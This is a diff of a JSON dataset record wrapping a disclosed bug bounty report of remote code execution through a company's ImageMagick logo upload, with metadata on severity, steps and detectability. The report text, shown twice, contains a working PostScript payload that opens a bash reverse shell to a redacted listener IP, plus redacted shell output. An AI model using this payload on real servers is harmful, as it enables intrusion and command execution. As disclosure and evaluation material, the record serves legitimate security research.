@@ -1,44 +1,48 @@
 {
-    "reported_to": "Semrush",
-    "reported_by": "fransrosen ",
-    "title": "Remote Code Execution on www.semrush.com/my_reports on Logo upload",
-    "content": "\nThe Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor\n<image_0>\nis passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2\nThe following PoC-payload was used to get a reverse shell when issuing the upload:\nSave it as test.jpg and upload it as an image for the logo:\nCode 180 Bytes\n1%!PS\n2userdict /setpagedevice undef\n3legal\n4{ null restore } stopped { pop } if\n5legal\n6mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/\u2588\u2588\u2588/8080 0>&1') currentdevice putdeviceprops\n(\u2588\u2588\u2588\u2588\u2588 is the IP of my listener)\nThis resulted in:\nCode 273 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3ls\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6app\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11\u2588\u2588\u2588\u2588\u2588\u2588\n12\u2588\u2588\u2588\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n15\u2588\u2588\u2588\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n17\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n18\u2588\u2588\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\n22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n23\u2588\u2588\u2588\n24\u2588\u2588\u2588\u2588\u2588\n25\u2588\u2588\u2588\u2588\u2588\u2588\n26\u2588\u2588\u2588\u2588\n27\u2588\u2588\u2588\u2588\u2588\n28\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n29\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n30\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n31\u2588\u2588\u2588\n32\u2588\u2588\u2588\n33\n34\n35\u2588\u2588\u2588\n36whoami\n37\u2588\u2588\u2588\u2588\n38\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n39\u2588\u2588\u2588\u2588\u2588\u2588\nAt this point I wasn't sure if this was a third party or not, so I checked two things:\n\u2588\u2588\u2588\u2588\u2588\u2588 to list files in the \u2588\u2588\u2588\u2588\u2588\u2588 dir. It showed me:\nCode 76 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI navigated to\nCode 83 Bytes\n1https://www.semrush.com/my_reports/\u2588\u2588\u2588\u2588\n2https://www.semrush.com/my_reports/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAnd confirmed those two files exists in this directory.\n/etc/hosts\nThis one confirmed it by:\nCode 78 Bytes\n1cat /etc/hosts\n2127.0.0.1 localhost\n3\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588.semrush.net \u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI'm certain this is a SEMrush-instance.\n{F340481}\nYou should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.\nRegards,\nFrans\nImpact\n\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Semrush",
+  "reported_by": "fransrosen ",
+  "title": "Remote Code Execution on www.semrush.com/my_reports on Logo upload",
+  "content": "\nThe Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor\n<image_0>\nis passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2\nThe following PoC-payload was used to get a reverse shell when issuing the upload:\nSave it as test.jpg and upload it as an image for the logo:\nCode 180 Bytes\n1%!PS\n2userdict /setpagedevice undef\n3legal\n4{ null restore } stopped { pop } if\n5legal\n6mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/\u2588\u2588\u2588/8080 0>&1') currentdevice putdeviceprops\n(\u2588\u2588\u2588\u2588\u2588 is the IP of my listener)\nThis resulted in:\nCode 273 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3ls\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6app\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11\u2588\u2588\u2588\u2588\u2588\u2588\n12\u2588\u2588\u2588\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n15\u2588\u2588\u2588\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n17\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n18\u2588\u2588\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\n22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n23\u2588\u2588\u2588\n24\u2588\u2588\u2588\u2588\u2588\n25\u2588\u2588\u2588\u2588\u2588\u2588\n26\u2588\u2588\u2588\u2588\n27\u2588\u2588\u2588\u2588\u2588\n28\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n29\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n30\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n31\u2588\u2588\u2588\n32\u2588\u2588\u2588\n33\n34\n35\u2588\u2588\u2588\n36whoami\n37\u2588\u2588\u2588\u2588\n38\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n39\u2588\u2588\u2588\u2588\u2588\u2588\nAt this point I wasn't sure if this was a third party or not, so I checked two things:\n\u2588\u2588\u2588\u2588\u2588\u2588 to list files in the \u2588\u2588\u2588\u2588\u2588\u2588 dir. It showed me:\nCode 76 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI navigated to\nCode 83 Bytes\n1https://www.semrush.com/my_reports/\u2588\u2588\u2588\u2588\n2https://www.semrush.com/my_reports/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAnd confirmed those two files exists in this directory.\n/etc/hosts\nThis one confirmed it by:\nCode 78 Bytes\n1cat /etc/hosts\n2127.0.0.1 localhost\n3\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588.semrush.net \u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI'm certain this is a SEMrush-instance.\n{F340481}\nYou should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.\nRegards,\nFrans\nImpact\n\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 5000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/480/40a07cdaaea89a928dc0f4966f4c4cf934c75d73/Screen_Shot_2018-08-31_at_14.46.54.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-08-31_at_14.46.54.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-08-31_at_14.46.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZULTDQBD%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T041129Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDplz9brzr514rVkb%2BNd3ul8FTyjgMZj8FeRr5q9%2BFMwgIgWpWNXsVuN9n5g0z1gxoZEcEMvaM2MmUQXdLt52ckgu4qsgUIJRADGgwwMTM2MTkyNzQ4NDkiDDeKAC2G%2BM3WZNN5UCqPBb9Ihol%2FEIfIcoj3w790kvbgzRdr2FS1l1gKrmep5tIn5%2FxKg5cyS4H8ahtiuoVR550dCPdcjW1nEDFNzZLIojZ15mh4qZgMB%2ByU%2FwkaQxVIf8JSG%2Bqi5EZFVbqxUORqV2G5rZ1HQrPclUH3%2F%2BC%2BwNsDCtIXeIVvRM6Z29xDilQWRSQhuSuPmS1P0zQVW94JJLw9oThJmemjk5Wl6ARjX46G%2BAUSkuSS83L4b0DpDuqn%2Ff6bhyY4%2B8zhQX0hCJZngufVVbt6LzniMAoCUr8kyFy%2BTuR4sVy6T9z9SkDZVo36F2vbO9WI3lOZJ7oaM5wJvcrR9ce2P7H4%2Fa8UaK4z43o1k6hUEiNezXHHROnmQ1Kuda6%2F05GHwOpctRnTa0oJJDGcUZiHH42ZUenioncnLbKRgqmWzYQQuotjb985f%2BH4PO7FArKs3EI7xPOJrXzQsZwkbhL8yUzcPdOzSz8hdovzRckyIoCFolkbHnVIhWV8BveSaDggRsJRpPfXiZvLbrnKs3lAMhUUrhTRwCeMy1EfSN3zZbDWDVuDA2UozzS3qtCXHgRcNi5VbcH7RVjCwNaJ5I9H886VRNww8NLGv0964nL21J%2B%2B3ABIfjVJtsQ0lZv9Fsr2DH%2BNYWWpVhlfKeEtv55pPFodxxm1tVnv9Kd4EIXbKaXGdJ45ZKWXL5HgxGo0JgbOMK1ITgOO6msJ7hLHVyeoX7f%2BUb8neMk8nuKBirf4Xxyh2RNejF1nz2dEW7nbYpoHr8TM515isMjKQahdNVTtx28UtjEG1hWkAOymVwdUcCnpFJIDp1stlfYCh1u9MrhJy61MKNbncaiIHymeOVFtZ63i%2FVyvipZjXbdvmOIzn39GmBASzRVnyOkwp%2FeNvwY6sQEXgnb6goVHZSrPqep70ec23NQhE3fHjrnirlyr2VJEKNmItq2AMzWs8r7lD3QXqBo8WFaP%2F7FRsvurBOp%2Flf8696rjbE9eYhMEjUnxgp78VYNjK8zBPu2iCbBAcXUBZmucCwVFZZoFP24ZGn0T4qGf%2BuUihhMm6onjaN%2F%2F0mW7l6q1XnzRt1RopkuYnQZT%2Fdtj5zHTkocC%2BP%2BUYsdLpCPXq%2BsblC%2FY1zI%2BFsEEfE7XaOw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47caddf747efa5e1b35ee8257cef88939013078a5a44fe04a5cc19e61fca6323"
+  },
+  "disclosed_date": 1561409820,
+  "report_url": "https://hackerone.com/reports/403417",
+  "is_multi_component": false,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to https://www.semrush.com/my_reports/constructor and upload a logo."
     ],
-    "bounty": 5000,
-    "weaknesses": [
-        "Command Injection - Generic"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/480/40a07cdaaea89a928dc0f4966f4c4cf934c75d73/Screen_Shot_2018-08-31_at_14.46.54.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-08-31_at_14.46.54.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-08-31_at_14.46.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZULTDQBD%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T041129Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDplz9brzr514rVkb%2BNd3ul8FTyjgMZj8FeRr5q9%2BFMwgIgWpWNXsVuN9n5g0z1gxoZEcEMvaM2MmUQXdLt52ckgu4qsgUIJRADGgwwMTM2MTkyNzQ4NDkiDDeKAC2G%2BM3WZNN5UCqPBb9Ihol%2FEIfIcoj3w790kvbgzRdr2FS1l1gKrmep5tIn5%2FxKg5cyS4H8ahtiuoVR550dCPdcjW1nEDFNzZLIojZ15mh4qZgMB%2ByU%2FwkaQxVIf8JSG%2Bqi5EZFVbqxUORqV2G5rZ1HQrPclUH3%2F%2BC%2BwNsDCtIXeIVvRM6Z29xDilQWRSQhuSuPmS1P0zQVW94JJLw9oThJmemjk5Wl6ARjX46G%2BAUSkuSS83L4b0DpDuqn%2Ff6bhyY4%2B8zhQX0hCJZngufVVbt6LzniMAoCUr8kyFy%2BTuR4sVy6T9z9SkDZVo36F2vbO9WI3lOZJ7oaM5wJvcrR9ce2P7H4%2Fa8UaK4z43o1k6hUEiNezXHHROnmQ1Kuda6%2F05GHwOpctRnTa0oJJDGcUZiHH42ZUenioncnLbKRgqmWzYQQuotjb985f%2BH4PO7FArKs3EI7xPOJrXzQsZwkbhL8yUzcPdOzSz8hdovzRckyIoCFolkbHnVIhWV8BveSaDggRsJRpPfXiZvLbrnKs3lAMhUUrhTRwCeMy1EfSN3zZbDWDVuDA2UozzS3qtCXHgRcNi5VbcH7RVjCwNaJ5I9H886VRNww8NLGv0964nL21J%2B%2B3ABIfjVJtsQ0lZv9Fsr2DH%2BNYWWpVhlfKeEtv55pPFodxxm1tVnv9Kd4EIXbKaXGdJ45ZKWXL5HgxGo0JgbOMK1ITgOO6msJ7hLHVyeoX7f%2BUb8neMk8nuKBirf4Xxyh2RNejF1nz2dEW7nbYpoHr8TM515isMjKQahdNVTtx28UtjEG1hWkAOymVwdUcCnpFJIDp1stlfYCh1u9MrhJy61MKNbncaiIHymeOVFtZ63i%2FVyvipZjXbdvmOIzn39GmBASzRVnyOkwp%2FeNvwY6sQEXgnb6goVHZSrPqep70ec23NQhE3fHjrnirlyr2VJEKNmItq2AMzWs8r7lD3QXqBo8WFaP%2F7FRsvurBOp%2Flf8696rjbE9eYhMEjUnxgp78VYNjK8zBPu2iCbBAcXUBZmucCwVFZZoFP24ZGn0T4qGf%2BuUihhMm6onjaN%2F%2F0mW7l6q1XnzRt1RopkuYnQZT%2Fdtj5zHTkocC%2BP%2BUYsdLpCPXq%2BsblC%2FY1zI%2BFsEEfE7XaOw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47caddf747efa5e1b35ee8257cef88939013078a5a44fe04a5cc19e61fca6323"
-    },
-    "disclosed_date": 1561409820,
-    "report_url": "https://hackerone.com/reports/403417",
-    "is_multi_component": false,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Navigate to https://www.semrush.com/my_reports/constructor and upload a logo."
-        ],
-        [
-            2,
-            "Use a crafted Postscript file (disguised as a JPG) containing a reverse shell payload to trigger Ghostscript execution."
-        ]
-    ],
-    "vuln_description": "The logo upload feature in SEMrush's report constructor is vulnerable to Remote Code Execution (RCE) due to an improperly patched version of ImageMagick. Attackers can exploit this by uploading a malicious Postscript file that triggers Ghostscript, allowing arbitrary command execution on the server.",
-    "reason": "The vulnerability requires knowledge of ImageMagick's interaction with Ghostscript and the specific file formats (EPS, PS, PDF, XPS) that can trigger it. The attack involves crafting a non-standard payload and understanding server-side image processing workflows, but the core exploit technique is well-documented in security research.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The vulnerability involves a Remote Code Execution (RCE) via a file upload feature, which is not directly related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, not on exploiting file upload vulnerabilities or server-side processing flaws.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Use a crafted Postscript file (disguised as a JPG) containing a reverse shell payload to trigger Ghostscript execution."
+    ]
+  ],
+  "vuln_description": "The logo upload feature in SEMrush's report constructor is vulnerable to Remote Code Execution (RCE) due to an improperly patched version of ImageMagick. Attackers can exploit this by uploading a malicious Postscript file that triggers Ghostscript, allowing arbitrary command execution on the server.",
+  "reason": "The vulnerability requires knowledge of ImageMagick's interaction with Ghostscript and the specific file formats (EPS, PS, PDF, XPS) that can trigger it. The attack involves crafting a non-standard payload and understanding server-side image processing workflows, but the core exploit technique is well-documented in security research.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an ImageMagick RCE through a logo upload feature, which is not directly related to authentication or authorization checks between user sessions and resources. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on detecting insecure file processing vulnerabilities.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The vulnerability involves exploiting ImageMagick's improper handling of Postscript files during logo uploads. The methodology's 'simple payload' approach focuses on common permutations and same-channel detection through regular navigation. While the attack vector (image upload parameter) might be discovered through step 3's parameter extraction, the payload requires specific Postscript/Ghostscript knowledge beyond basic encoding/context manipulation. The RCE execution confirmation also requires an out-of-band reverse shell connection rather than same-channel detection through application responses, making it undetectable through regular navigation patterns. The vulnerability relies on specific library implementation flaws rather than generic injection patterns covered by 'simple payloads'.",
+    "is_simple_injection": false
+  }
 }
